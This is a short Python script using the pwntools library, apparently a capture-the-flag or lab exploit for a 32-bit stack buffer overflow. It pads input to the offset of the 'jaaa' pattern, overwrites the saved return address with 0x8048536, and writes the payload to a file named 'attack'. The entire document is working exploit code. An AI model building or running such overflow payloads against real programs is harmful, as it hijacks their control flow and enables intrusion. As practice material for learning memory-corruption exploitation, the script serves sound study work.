from pwn import *

padding = cyclic(cyclic_find('jaaa'))
eip = p32(0x8048536)
payload = padding + eip
# print(payload)
with open("attack", "wb") as f:
    f.write(payload)
